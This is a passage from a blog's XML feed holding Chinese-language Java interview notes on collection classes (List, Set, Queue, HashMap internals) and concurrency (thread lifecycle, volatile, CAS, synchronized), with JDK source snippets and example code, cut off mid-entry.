    
    
    
    <entry>
      <title>Java collection</title>
      <link href="/2023/01/10/2023-01-10-%E9%9D%A2%E7%BB%8FJava%E9%9B%86%E5%90%88/"/>
      <url>/2023/01/10/2023-01-10-%E9%9D%A2%E7%BB%8FJava%E9%9B%86%E5%90%88/</url>
      
        <content type="html"><![CDATA[<p>ok</p><a id="more"></a><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://oss.javaguide.cn/github/javaguide/java/collection/java-collection-hierarchy.png" alt title>                </div>                <div class="image-caption"></div>            </figure><h2 id="Collection"><a href="#Collection" class="headerlink" title="Collection"></a>Collection</h2><ul><li>List<ul><li>ArrayList: Object[]</li><li>Vector: Object[]</li><li>LinkedList: 双向链表</li></ul></li><li>Set<ul><li>HashSet(无序，唯一): 底层采用 HashMap 来保存元素-</li><li>LinkedHashSet: HashSet 的子类，通过 LinkedHashMap 来实现的</li><li>TreeSet(有序，唯一): 红黑树(自平衡的排序二叉树)</li></ul></li><li>Queue<ul><li>PriorityQueue: Object[] 数组实现二叉堆</li><li>ArrayQueue: Object[] 数组+双指针<h2 id="Map"><a href="#Map" class="headerlink" title="Map"></a>Map</h2></li></ul></li><li>HashMap<ul><li>开始是链表，链表长度大于阈值8，进行扩容，当容量大于64时，变成红黑树</li></ul></li><li>LinkedHashMap<ul><li>在HashMap的基础上，增加了一条双向链表，保持KV的插入顺序</li></ul></li><li>Hashtable<ul><li>数组+链表组成的，数组是 Hashtable 的主体，链表则是主要为了解决哈希冲突而存在的</li></ul></li><li>TreeMap：红黑树<h2 id="TIPs"><a href="#TIPs" class="headerlink" title="TIPs"></a>TIPs</h2></li></ul><ol><li>保证线程安全的手段？Concurrent修饰的Map等</li><li>持续更新</li></ol><h2 id="List实现"><a href="#List实现" class="headerlink" title="List实现"></a>List实现</h2><h3 id="ArrayList-和-Array-的区别"><a href="#ArrayList-和-Array-的区别" class="headerlink" title="ArrayList 和 Array 的区别"></a>ArrayList 和 Array 的区别</h3><ul><li>一个动态数组和静态数组</li><li>区别类似于go语言和python的slice实现</li></ul><ol><li>声明时不需要指定大小，动态扩容</li><li>支持泛型</li><li>支持插入、更改、删除<br>【面试题】说说ArrayList的扩容机制</li></ol><h3 id="ArrayList-和-Vector-的区别"><a href="#ArrayList-和-Vector-的区别" class="headerlink" title="ArrayList 和 Vector 的区别"></a>ArrayList 和 Vector 的区别</h3><ul><li>ArrayList线程不安全</li><li>Vector使用了synchronized关键字保证线程安全<h3 id="Vector-和-Stack-的区别"><a href="#Vector-和-Stack-的区别" class="headerlink" title="Vector 和 Stack 的区别"></a>Vector 和 Stack 的区别</h3>Vector 和 Stack 已经被淘汰，推荐使用并发集合类</li></ul><ol><li>ConcurrentHashMap、CopyOnWriteArrayList等，</li><li>或者手动实现线程安全的方法来提供安全的多线程操作支持。</li></ol><h3 id="ArrayList-可以添加-null-值吗？"><a href="#ArrayList-可以添加-null-值吗？" class="headerlink" title="ArrayList 可以添加 null 值吗？"></a>ArrayList 可以添加 null 值吗？</h3><p>ArrayList 中可以存储任何类型的对象，包括 null 值。不过，不建议向ArrayList 中添加 null 值， null 值无意义，会让代码难以维护比如忘记做判空处理就会导致空指针异常。</p><h2 id="Set实现"><a href="#Set实现" class="headerlink" title="Set实现"></a>Set实现</h2><h3 id="Comparable-和-Comparator-的区别：都是用于排序"><a href="#Comparable-和-Comparator-的区别：都是用于排序" class="headerlink" title="Comparable 和 Comparator 的区别：都是用于排序"></a>Comparable 和 Comparator 的区别：都是用于排序</h3><ul><li>Comparable 接口实际上是出自 java.lang 包 它有一个 compareTo(Object obj)方法用来排序</li><li>Comparator 接口实际上是出自 java.util 包 它有一个 compare(Object obj1, Object obj2)方法用来排序</li><li>需要对一个集合使用自定义排序时，我们就要重写compareTo()方法或compare()方法</li></ul><h2 id="Queue实现"><a href="#Queue实现" class="headerlink" title="Queue实现"></a>Queue实现</h2><h3 id="Queue-与-Deque-的区别"><a href="#Queue-与-Deque-的区别" class="headerlink" title="Queue 与 Deque 的区别"></a>Queue 与 Deque 的区别</h3><ul><li>Queue是单端队列，遵循先进先出（FIFO）规则</li><li>Deque 是双端队列，在队列的两端均可以插入或删除元素</li></ul><h3 id="PriorityQueue实现：默认最小二叉堆"><a href="#PriorityQueue实现：默认最小二叉堆" class="headerlink" title="PriorityQueue实现：默认最小二叉堆"></a>PriorityQueue实现：默认最小二叉堆</h3><ul><li>P利用了二叉堆的数据结构来实现的，底层使用可变长的数组来存储数据</li><li>PriorityQueue 通过堆元素的上浮和下沉，实现了在 O(logn) 的时间复杂度内插入元素和删除堆顶元素。</li><li>PriorityQueue 是非线程安全的，且不支持存储 NULL 和 non-comparable 的对象。</li><li>PriorityQueue 默认是小顶堆，但可以接收一个 Comparator 作为构造参数，从而来自定义元素优先级的先后。</li><li>PriorityQueue 在面试中可能更多的会出现在手撕算法的时候，典型例题包括堆排序、求第 K 大的数、带权图的遍历等，所以需要会熟练使用才行。</li></ul><p>手撕一个priorityqueue</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="BlockingQueue"><a href="#BlockingQueue" class="headerlink" title="BlockingQueue"></a>BlockingQueue</h3><ul><li>支持当队列没有元素时一直阻塞，用于生产者消费者模型</li><li>生产者线程会向队列中添加数据，而消费者线程会从队列中取出数据进行处理</li></ul><p><strong>ArrayBlockingQueue</strong> 和 <strong>LinkedBlockingQueue</strong> 是 Java 并发包中常用的两种阻塞队列实现</p><ul><li>都线程安全，Array底层用的固定数组，Linked底层用的链表，也是扩容机制</li><li>ArrayBlockingQueue 生产和消费用的是同一个锁</li><li>LinkedBlockingQueue 生产用putLock，消费用的takelock，防止生产者和消费者线程之间的锁争夺</li></ul><h2 id="Map实现"><a href="#Map实现" class="headerlink" title="Map实现"></a>Map实现</h2><h3 id="HashMap-和-Hashtable-淘汰-的区别"><a href="#HashMap-和-Hashtable-淘汰-的区别" class="headerlink" title="HashMap 和 Hashtable(淘汰) 的区别"></a>HashMap 和 Hashtable(淘汰) 的区别</h3><ul><li><p>HashMap 是线程不安全的，线程安全版ConcurrentHashMap</p></li><li><p>Hashtable 是线程安全的</p></li><li><p>HashMap 可以存储 null 的 kv，但 null 作为键只能有一个，null 作为值可以多个</p></li><li><p>Hashtable 不允许有 null 键和 null 值，否则会抛NullPointerException<br>HashMap的构造函数以及扩容函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">HashMap</span><span class="params">(<span class="keyword">int</span> initialCapacity, <span class="keyword">float</span> loadFactor)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (initialCapacity &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Illegal initial capacity: "</span> +</span><br><span class="line">                                            initialCapacity);</span><br><span class="line">    <span class="keyword">if</span> (initialCapacity &gt; MAXIMUM_CAPACITY)</span><br><span class="line">        initialCapacity = MAXIMUM_CAPACITY;</span><br><span class="line">    <span class="keyword">if</span> (loadFactor &lt;= <span class="number">0</span> || Float.isNaN(loadFactor))</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Illegal load factor: "</span> +</span><br><span class="line">                                            loadFactor);</span><br><span class="line">    <span class="keyword">this</span>.loadFactor = loadFactor;</span><br><span class="line">    <span class="keyword">this</span>.threshold = tableSizeFor(initialCapacity);</span><br><span class="line">&#125;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">HashMap</span><span class="params">(<span class="keyword">int</span> initialCapacity)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>(initialCapacity, DEFAULT_LOAD_FACTOR);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">tableSizeFor</span><span class="params">(<span class="keyword">int</span> cap)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n = cap - <span class="number">1</span>;</span><br><span class="line">    n |= n &gt;&gt;&gt; <span class="number">1</span>;</span><br><span class="line">    n |= n &gt;&gt;&gt; <span class="number">2</span>;</span><br><span class="line">    n |= n &gt;&gt;&gt; <span class="number">4</span>;</span><br><span class="line">    n |= n &gt;&gt;&gt; <span class="number">8</span>;</span><br><span class="line">    n |= n &gt;&gt;&gt; <span class="number">16</span>;</span><br><span class="line">    <span class="keyword">return</span> (n &lt; <span class="number">0</span>) ? <span class="number">1</span> : (n &gt;= MAXIMUM_CAPACITY) ? MAXIMUM_CAPACITY : n + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="HashSet"><a href="#HashSet" class="headerlink" title="HashSet"></a>HashSet</h3><ul><li>HashSet如何检查重复的： 底层使用HashMap<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">add</span><span class="params">(E e)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> map.put(e, PRESENT)==<span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="HashMap的底层实现"><a href="#HashMap的底层实现" class="headerlink" title="HashMap的底层实现"></a>HashMap的底层实现</h3><ul><li>hash()函数,拉链法解决冲突<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">hash</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> h;</span><br><span class="line">    <span class="comment">// key.hashCode()：返回散列值也就是hashcode</span></span><br><span class="line">    <span class="comment">// ^：按位异或</span></span><br><span class="line">    <span class="comment">// &gt;&gt;&gt;:无符号右移，忽略符号位，空位都以0补齐</span></span><br><span class="line">    <span class="keyword">return</span> (key == <span class="keyword">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="HashMap线程不安全"><a href="#HashMap线程不安全" class="headerlink" title="HashMap线程不安全"></a>HashMap线程不安全</h3><ul><li>jdk1.7前，HashMap 扩容时会造成死循环和数据丢失的问题</li><li>jdk1.8后，多个kv可能会被分配到同一个桶（bucket），并以链表或红黑树的形式存储。多个线程对 HashMap 的 put 操作会导致线程不安全，具体来说会有数据覆盖的风险。<h3 id="HashMap遍历"><a href="#HashMap遍历" class="headerlink" title="HashMap遍历"></a>HashMap遍历</h3><a href="https://mp.weixin.qq.com/s/zQBN3UvJDhRTKP6SzcZFKw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/zQBN3UvJDhRTKP6SzcZFKw</a></li><li>结论，尽量使用 entrySet 来实现 Map 集合的遍历</li><li>不能再在遍历中使用集合 map.remove() 来删除数据，这是非安全的操作方式</li><li>但可以使用迭代器的 iterator.remove() 的方法来删除数据，这是安全的删除集合的方式<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HashMapTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 创建并赋值 HashMap</span></span><br><span class="line">        Map&lt;Integer, String&gt; map = <span class="keyword">new</span> HashMap();</span><br><span class="line">        map.put(<span class="number">1</span>, <span class="string">"Java"</span>);</span><br><span class="line">        map.put(<span class="number">2</span>, <span class="string">"JDK"</span>);</span><br><span class="line">        map.put(<span class="number">3</span>, <span class="string">"Spring Framework"</span>);</span><br><span class="line">        map.put(<span class="number">4</span>, <span class="string">"MyBatis framework"</span>);</span><br><span class="line">        map.put(<span class="number">5</span>, <span class="string">"Java中文社群"</span>);</span><br><span class="line">        <span class="comment">// 迭代器 entrySet 遍历</span></span><br><span class="line">        Iterator&lt;Map.Entry&lt;Integer, String&gt;&gt; iterator =</span><br><span class="line">            map.entrySet().iterator();</span><br><span class="line">        <span class="keyword">while</span> (iterator.hasNext()) &#123;</span><br><span class="line">            Map.Entry&lt;Integer, String&gt; entry = iterator.next();</span><br><span class="line">            System.out.println(entry.getKey());</span><br><span class="line">            System.out.println(entry.getValue());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 迭代器 keySet 遍历</span></span><br><span class="line">        Iterator&lt;Integer&gt; iterator = map.keySet().iterator();</span><br><span class="line">        <span class="keyword">while</span>(iterator.hasNext())&#123;</span><br><span class="line">            Integer key = iterator.next();</span><br><span class="line">            System.out.println(key);</span><br><span class="line">            System.out.println(map.get(key));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// for-each  遍历 entrySet()</span></span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;Integer, String&gt; entry : map.entrySet()) &#123;</span><br><span class="line">            System.out.println(entry.getKey());</span><br><span class="line">            System.out.println(entry.getValue());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// for-each  遍历 keySet()</span></span><br><span class="line">        <span class="keyword">for</span> (Integer key : map.keySet()) &#123;</span><br><span class="line">            System.out.println(key);</span><br><span class="line">            System.out.println(map.get(key));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// Lambda表达式</span></span><br><span class="line">        map.forEach((key, value) -&gt; &#123;</span><br><span class="line">            System.out.println(key);</span><br><span class="line">            System.out.println(value);</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="comment">// Streams API 单线程</span></span><br><span class="line">        map.entrySet().stream().forEach((entry) -&gt; &#123;</span><br><span class="line">            System.out.println(entry.getKey());</span><br><span class="line">            System.out.println(entry.getValue());</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="comment">// Streams API 多线程</span></span><br><span class="line">        map.entrySet().parallelStream().forEach((entry) -&gt; &#123;</span><br><span class="line">            System.out.println(entry.getKey());</span><br><span class="line">            System.out.println(entry.getValue());</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试 </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java concur</title>
      <link href="/2023/01/10/2023-01-10-%E9%9D%A2%E7%BB%8FJava%E5%B9%B6%E5%8F%91/"/>
      <url>/2023/01/10/2023-01-10-%E9%9D%A2%E7%BB%8FJava%E5%B9%B6%E5%8F%91/</url>
      
        <content type="html"><![CDATA[<p>ok</p><a id="more"></a><h2 id="java线程和linux的C-线程有何区别"><a href="#java线程和linux的C-线程有何区别" class="headerlink" title="java线程和linux的C++线程有何区别"></a>java线程和linux的C++线程有何区别</h2><p>Java线程：Java中的异常处理机制可以捕获和处理线程中的异常。</p><p>C++线程：C++线程中的异常会导致程序终止，除非显式地进行了异常处理。</p><h2 id="java线程"><a href="#java线程" class="headerlink" title="java线程"></a>java线程</h2><p>多个线程共享进程的堆和方法区 (JDK1.8 之后的元空间)资源，但是每个线程有自己的<strong>程序计数器、虚拟机栈 和 本地方法栈。</strong></p><ul><li>程序计数器PC，需要按顺序实行机器指令；多线程情况下，相当于一个指针指向执行位置，恢复上下文</li><li>如果执行的是 native 方法，那么程序计数器记录的是 undefined 地址，只有执行的是 Java 代码时程序计数器记录的才是下一条指令的地址。</li></ul><p>虚拟机栈和本地方法栈为什么私有</p><ul><li>每个方法的栈帧用于存储局部变量表、操作数栈、常量池引用等信息。从方法调用直至执行完成的过程，就对应着一个栈帧在 Java 虚拟机栈中入栈和出栈的过程</li><li>本地方法栈则为虚拟机使用到的 Native 方法服务。 在 HotSpot 虚拟机中和 Java 虚拟机栈合二为一。<h2 id="java线程的生命周期"><a href="#java线程的生命周期" class="headerlink" title="java线程的生命周期"></a>java线程的生命周期</h2>Java 线程在运行的生命周期中的指定时刻只可能处于下面 6 种不同状态的其中一个状态：</li><li>NEW: 初始状态，线程被创建出来但没有被调用 start() 。</li><li>RUNNABLE: 运行状态，线程被调用了 start()等待运行的状态。</li><li>BLOCKED：阻塞状态，需要等待锁释放。</li><li>WAITING：等待状态，表示该线程需要等待其他线程做出一些特定动作（通知或中断）。</li><li>TIME_WAITING：超时等待状态，可以在指定的时间后自行返回而不是像 WAITING 那样一直等待。</li><li>TERMINATED：终止状态，表示该线程已经运行完毕。</li></ul><h2 id="线程死锁"><a href="#线程死锁" class="headerlink" title="线程死锁"></a>线程死锁</h2><h3 id="sleep-方法和-wait-方法对比"><a href="#sleep-方法和-wait-方法对比" class="headerlink" title="sleep() 方法和 wait() 方法对比"></a>sleep() 方法和 wait() 方法对比</h3><ol><li>wait释放了锁，sleep没释放锁，所以wait会被用于线程间的同步，sleep常用于暂停程序</li><li>wait的线程不自动苏醒，需要同一对象的其他线程使用notify去唤醒，sleep的时间过完会自动往下执行</li></ol><ul><li>wait执行完释放了锁</li><li>sleep没有释放锁，可能导致死锁</li><li>wait() 通常被用于线程间交互/通信</li><li>sleep()通常被用于暂停执行。</li><li>wait() 方法被调用后，线程不会自动苏醒，需要别的线程调用同一个对象上的 notify()或者 notifyAll() 方法。</li><li>sleep()方法执行完成后，线程会自动苏醒，或者也可以使用 wait(long timeout) 超时后线程会自动苏醒。</li><li>sleep() 是 Thread 类的静态本地方法，wait() 则是 Object 类的本地方法。</li></ul><h3 id="为什么-wait-方法不定义在-Thread-中"><a href="#为什么-wait-方法不定义在-Thread-中" class="headerlink" title="为什么 wait() 方法不定义在 Thread 中"></a>为什么 wait() 方法不定义在 Thread 中</h3><ul><li>wait() 是让获得对象锁的线程实现等待，会自动释放当前线程占有的对象锁。</li><li>每个对象（Object）都拥有对象锁，既然要释放当前线程占有的对象锁并让其进入 WAITING 状态，自然是要操作对应的对象（Object）而非当前的线程（Thread）。<h3 id="为什么sleep方法定义在Thread中"><a href="#为什么sleep方法定义在Thread中" class="headerlink" title="为什么sleep方法定义在Thread中"></a>为什么sleep方法定义在Thread中</h3></li><li>sleep() 是让当前线程暂停执行，不涉及到对象类，也不需要获得对象锁。</li></ul><h3 id="【面试题】可以直接调用-Thread-类的-run-方法吗"><a href="#【面试题】可以直接调用-Thread-类的-run-方法吗" class="headerlink" title="【面试题】可以直接调用 Thread 类的 run 方法吗"></a>【面试题】可以直接调用 Thread 类的 run 方法吗</h3><p>【回答】可以直接调用，但是直接执行 run() 方法，不经过start()时，jvm会把 run() 方法当成一个 main 线程下的普通方法去执行，并不会在某个线程中执行它</p><ul><li>调用 start() 方法方可启动线程并使线程进入就绪状态</li><li>直接执行 run() 方法的话不会以多线程的方式执行</li></ul><h2 id="Java内存模型"><a href="#Java内存模型" class="headerlink" title="Java内存模型"></a>Java内存模型</h2><h3 id="共享内存：volatile声明变量共享，防止jvm指令重排"><a href="#共享内存：volatile声明变量共享，防止jvm指令重排" class="headerlink" title="共享内存：volatile声明变量共享，防止jvm指令重排"></a>共享内存：volatile声明变量共享，防止jvm指令重排</h3><ul><li>该变量可能会被多个线程同时访问</li><li>每次读区都从内存读，不会被本地线程缓存</li><li>可确保可见性和有序性，但<strong>不能保证原子性</strong></li></ul><p><strong>这个变量在堆上还是在栈上</strong>？</p><ul><li>至于变量在哪里存储，volatile 关键字主要影响了变量的可见性，在堆还是栈上取决于它是成员变量还是局部变量<h3 id="禁止指令重排序：volatile"><a href="#禁止指令重排序：volatile" class="headerlink" title="禁止指令重排序：volatile"></a>禁止指令重排序：volatile</h3>一个jvm调优的办法，jvm会自动重排，有可能导致性能下降。unsafe类提供了直接操作内存的方法，volatile的变量在读写时，插入读写屏障来禁止指令重排<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title">loadFence</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title">storeFence</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title">fullFence</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure></li></ul><h2 id="乐观锁悲观锁"><a href="#乐观锁悲观锁" class="headerlink" title="乐观锁悲观锁"></a>乐观锁悲观锁</h2><ul><li>乐观锁是线程无需等待，只在提交修改的时候验证资源是否被修改</li><li>悲观锁是显式的synchronized或者reentrantlock独占锁</li></ul><p><strong>CAS算法</strong>，<code>java.util.concurrent.atomic</code>包下面的原子变量类（比如<code>AtomicInteger</code>、<code>LongAdder</code>）就是使用了乐观锁的一种实现方式 CAS Compare And Swap（比较与交换）实现的。</p><h3 id="区别：高并发场景下，乐观锁不会造成死锁或阻塞问题。"><a href="#区别：高并发场景下，乐观锁不会造成死锁或阻塞问题。" class="headerlink" title="区别：高并发场景下，乐观锁不会造成死锁或阻塞问题。"></a>区别：高并发场景下，乐观锁不会造成死锁或阻塞问题。</h3><ul><li><p>高并发的场景下，乐观锁相比悲观锁来说，不存在锁竞争造成线程阻塞，也不会有死锁的问题，在性能上往往会更胜一筹。</p></li><li><p>但是，如果冲突频繁发生（写占比非常多的情况），会频繁失败和重试，这样同样会非常影响性能，导致 CPU 飙升。</p><h3 id="两者使用方式"><a href="#两者使用方式" class="headerlink" title="两者使用方式"></a>两者使用方式</h3></li><li><p>悲观锁通常多用于写比较多的情况（多写场景，竞争激烈），这样可以避免频繁失败和重试影响性能，悲观锁的开销是固定的。</p></li><li><p>不过，如果乐观锁解决了频繁失败和重试这个问题的话（比如LongAdder），也是可以考虑使用乐观锁的，要视实际情况而定。乐观锁通常多用于写比较少的情况（多读场景，竞争较少），这样可以避免频繁加锁影响性能。不过，乐观锁主要针对的对象是单个共享变量（参考<code>java.util.concurrent.atomic</code>包下面的原子变量类）。</p></li></ul><h3 id="CAS算法流程"><a href="#CAS算法流程" class="headerlink" title="CAS算法流程"></a>CAS算法流程</h3><ul><li>是一个原子操作</li><li>涉及到 var变量，expected预期值，new预期写入的新值</li><li>当v = e时，通过new更新v，如果v != e,就说明其他进程要写，当前线程放弃更新</li><li>当多个线程同时使用 CAS 操作一个变量时，只有一个会成功更新，其余均会失败，但失败的线程并不会被挂起，仅是被告知失败，并且允许再次尝试，当然也允许失败的线程放弃操作。</li></ul><ol><li>java语言中的cas类是通过<code>unsafe</code>类里的<code>compareAndSwapObject</code>实现的</li><li>它是C++内联汇编的产物</li></ol><h2 id="乐观锁的ABA问题"><a href="#乐观锁的ABA问题" class="headerlink" title="乐观锁的ABA问题"></a>乐观锁的ABA问题</h2><p><strong>检查变量的时候，原值为A，要赋值为B时检测为A，但是不能保证这之前没有被其他线程修改过</strong></p><p>解决思路：在变量前追加版本号/时间戳：<code>AtomicStampedReference</code></p><h2 id="乐观锁的循环时间长的问题"><a href="#乐观锁的循环时间长的问题" class="headerlink" title="乐观锁的循环时间长的问题"></a>乐观锁的循环时间长的问题</h2><p>CAS使用自旋锁来进行重试，降低消耗使用pause指令</p><h2 id="synchronized关键字"><a href="#synchronized关键字" class="headerlink" title="synchronized关键字"></a>synchronized关键字</h2><ul><li>修饰实例方法：锁当前对象实例</li><li>修饰静态方法：锁当前类</li><li>修饰代码块：对括号里指定的对象/类加锁<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 给当前对象实例加锁，进入同步代码前要获得 当前对象实例的锁 。</span></span><br><span class="line"><span class="function"><span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">method</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">//业务代码</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 给当前类加锁，会作用于类的所有对象实例 ，进入同步代码前要获得 当前 class 的锁</span></span><br><span class="line"><span class="function"><span class="keyword">synchronized</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">method</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">//业务代码</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// synchronized(object) 表示进入同步代码库前要获得 给定对象的锁。</span></span><br><span class="line"><span class="comment">// synchronized(类.class) 表示进入同步代码前要获得 给定 Class 的锁</span></span><br><span class="line"><span class="keyword">synchronized</span>(<span class="keyword">this</span>) &#123;</span><br><span class="line">    <span class="comment">//业务代码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><ol><li>synchronized(A.class) 和修饰static方法都是要锁的class</li><li>synchronized+方法是给实例对象加锁</li></ol><h3 id="问题-静态-synchronized-方法和非静态-synchronized-方法之间的调用互斥么？"><a href="#问题-静态-synchronized-方法和非静态-synchronized-方法之间的调用互斥么？" class="headerlink" title="[问题]静态 synchronized 方法和非静态 synchronized 方法之间的调用互斥么？"></a>[问题]静态 synchronized 方法和非静态 synchronized 方法之间的调用互斥么？</h3><p>不互斥！锁的是两种不同的方法，静态用的是当前类的锁，非静态锁的是单个实例对象</p><h2 id="构造方法能不能使用-synchronized-关键字修饰【不能】"><a href="#构造方法能不能使用-synchronized-关键字修饰【不能】" class="headerlink" title="构造方法能不能使用 synchronized 关键字修饰【不能】"></a>构造方法能不能使用 synchronized 关键字修饰【不能】</h2><ul><li>因为构造方法本身属于线程安全，构造一个对象是原子操作<br>多线程可能有些特殊情况造成不安全。</li><li>比如说逃逸问题：<br>如果在构造方法中将未完全初始化的对象引用传递给其他线程，其他线程可能会在对象完全初始化之前访问它，这也可能导致线程不安全<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EscapingExample</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> SomeObject sharedObject;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">EscapingExample</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        sharedObject = <span class="keyword">new</span> SomeObject(); <span class="comment">// 逃逸</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>构造时，可以使用静态工厂方法构造对象</p><h2 id="底层原理了解吗，很了解，通过对象监视器和访问标识来实现"><a href="#底层原理了解吗，很了解，通过对象监视器和访问标识来实现" class="headerlink" title="底层原理了解吗，很了解，通过对象监视器和访问标识来实现"></a>底层原理了解吗，很了解，通过对象监视器和访问标识来实现</h2><ul><li>synchronized 同步语句块：使用的是 monitorenter 和 monitorexit 指令，其中 monitorenter 指令指向同步代码块的开始位置，monitorexit 指令则指明同步代码块的结束位置。</li><li>修饰方法：JVM通过一个访问标识<code>ACC_SYNCHRONIZED</code> 指明这一个同步方法</li></ul><h2 id="synchronized-和-volatile关键字，互补"><a href="#synchronized-和-volatile关键字，互补" class="headerlink" title="synchronized 和 volatile关键字，互补"></a>synchronized 和 volatile关键字，互补</h2><ul><li>volatile 